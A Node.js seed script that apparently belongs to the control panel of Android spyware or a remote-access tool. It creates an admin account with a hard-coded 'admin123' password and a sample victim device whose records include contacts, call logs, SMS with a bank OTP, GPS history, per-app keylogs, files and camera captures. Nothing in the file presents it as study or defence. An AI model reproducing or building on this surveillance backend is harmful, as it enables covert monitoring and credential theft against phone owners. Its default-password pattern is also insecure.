/**
 * seed.js — Run once to create admin user + sample device data (JSON DB version)
 * Usage:  node server/seed.js
 */

const bcrypt = require("bcryptjs");
const { Users, Devices } = require("./config/db");

async function seed() {
  console.log("🌱 Starting seed for JSON database...");

  // ── Admin user ──────────────────────────────────────────────────────────────
  const existingUser = Users.findOne({ username: "admin" });
  if (!existingUser) {
    const hashed = await bcrypt.hash("admin123", 10);
    const user = Users.create({ username: "admin", password: hashed });
    console.log("✅ Admin user created → user: admin | pass: admin123");
    console.log(`   ID: ${user._id}`);
  } else {
    console.log("ℹ️  Admin user already exists");
  }

  // ── Sample device ───────────────────────────────────────────────────────────
  const existingDevice = Devices.find().find(d => d.imei === "323231531412444");
  if (!existingDevice) {
    const now = new Date().toLocaleString("en-IN");
    const device = Devices.create({
      imei:       "323231531412444",
      name:       "Google Pixel 7",
      phone:      "+91 98765 43210",
      email:      "user@example.com",
      comments:   "Test device — Kolkata",
      lastOnline: now,
      ip:         "192.168.1.42",
      model:      "Pixel 7 Pro",
      os:         "Android 14",
      battery:    "78%",

      contacts: [
        { name: "Alice Sharma",   number: "+91 99001 11001", email: "alice@example.com" },
        { name: "Bob Roy",        number: "+91 99002 22002", email: "bob@example.com" },
        { name: "Carol Das",      number: "+91 99003 33003", email: "" },
        { name: "David Mukherjee",number: "+91 99004 44004", email: "david@example.com" },
        { name: "Eva Banerjee",   number: "+91 99005 55005", email: "" }
      ],

      callLogs: [
        { name: "Alice Sharma",   number: "+91 99001 11001", type: "incoming", duration: "3m 24s", date: "2026-03-30 09:12" },
        { name: "Bob Roy",        number: "+91 99002 22002", type: "outgoing", duration: "1m 05s", date: "2026-03-30 11:45" },
        { name: "Unknown",        number: "+91 80000 12345", type: "missed",   duration: "0s",     date: "2026-03-30 14:22" },
        { name: "Carol Das",      number: "+91 99003 33003", type: "outgoing", duration: "7m 11s", date: "2026-03-29 18:30" },
        { name: "Eva Banerjee",   number: "+91 99005 55005", type: "incoming", duration: "2m 48s", date: "2026-03-29 20:05" }
      ],

      sms: [
        { sender: "AD-BKAXXX",  message: "Your OTP is 482910. Do not share.",              type: "inbox", date: "2026-03-31 08:00" },
        { sender: "Bob Roy",    message: "Can you call me back?",                            type: "inbox", date: "2026-03-30 10:30" },
        { sender: "Me",         message: "On my way, 10 mins.",                              type: "sent",  date: "2026-03-30 10:32" },
        { sender: "AD-HDFCBK", message: "INR 2,500 debited from your account.",             type: "inbox", date: "2026-03-29 15:15" },
        { sender: "Alice",      message: "Lunch tomorrow at 1pm?",                           type: "inbox", date: "2026-03-28 19:00" }
      ],

      location: [
        { lat: "22.5726", lng: "88.3639", address: "Kolkata, West Bengal, India",         date: "2026-03-31 08:45" },
        { lat: "22.5800", lng: "88.3500", address: "Salt Lake, Kolkata",                   date: "2026-03-30 16:20" },
        { lat: "22.5404", lng: "88.3519", address: "Park Street, Kolkata",                 date: "2026-03-29 13:10" }
      ],

      apps: [
        { name: "WhatsApp",  packageName: "com.whatsapp",         version: "2.24.3.78", installed: "2023-06-12" },
        { name: "Chrome",    packageName: "com.android.chrome",   version: "121.0.6167", installed: "2022-01-01" },
        { name: "Instagram", packageName: "com.instagram.android",version: "315.0.0",   installed: "2023-08-20" },
        { name: "Telegram",  packageName: "org.telegram.messenger",version: "10.2.5",   installed: "2023-03-07" },
        { name: "GPay",      packageName: "com.google.android.apps.nbu.paisa.user",version:"258.0",installed:"2022-11-01"}
      ],

      files: [
        { name: "photo_2026.jpg",      path: "/sdcard/DCIM/photo_2026.jpg",      size: "3.2 MB", modified: "2026-03-31" },
        { name: "document.pdf",        path: "/sdcard/Download/document.pdf",     size: "1.1 MB", modified: "2026-03-28" },
        { name: "recording_01.mp3",    path: "/sdcard/Music/recording_01.mp3",   size: "4.5 MB", modified: "2026-03-27" },
        { name: "backup_data.zip",     path: "/sdcard/backup_data.zip",           size: "22 MB",  modified: "2026-03-25" },
        { name: "screenshot_home.png", path: "/sdcard/Pictures/screenshot_home.png", size: "890 KB", modified: "2026-03-30" }
      ],

      keylogs: [
        { app: "com.whatsapp",          text: "Hey, are you free tonight?",   date: "2026-03-31 09:00" },
        { app: "com.android.chrome",    text: "bank transfer online",          date: "2026-03-30 14:05" },
        { app: "com.instagram.android", text: "just posted a new reel!",       date: "2026-03-29 17:30" },
        { app: "org.telegram.messenger",text: "meeting at 5pm confirmed",      date: "2026-03-28 11:15" }
      ],

      iplogs: [
        { ip: "192.168.1.42",  network: "Home WiFi (Jio Fiber)",  date: "2026-03-31 08:00" },
        { ip: "10.0.0.18",     network: "Office WiFi",             date: "2026-03-30 09:00" },
        { ip: "49.32.11.200",  network: "Mobile Data (Airtel 4G)", date: "2026-03-29 12:30" }
      ],

      camera: [
        { filename: "IMG_20260331_085512.jpg", url: "", date: "2026-03-31 08:55" },
        { filename: "IMG_20260330_153022.jpg", url: "", date: "2026-03-30 15:30" },
        { filename: "IMG_20260329_120010.jpg", url: "", date: "2026-03-29 12:00" }
      ],

      wifiLogs: []
    });

    console.log("✅ Sample device created → IMEI: 323231531412444");
    console.log(`   ID: ${device._id}`);
  } else {
    console.log("ℹ️  Sample device already exists");
  }

  console.log("\n🎉 Seed complete!");
  console.log("👉 Login: admin / admin123");
  console.log("👉 Run server: npm start");
  console.log("👉 Visit: http://localhost:5000");
  process.exit(0);
}

seed().catch(err => {
  console.error("❌ Seed error:", err.message);
  process.exit(1);
});
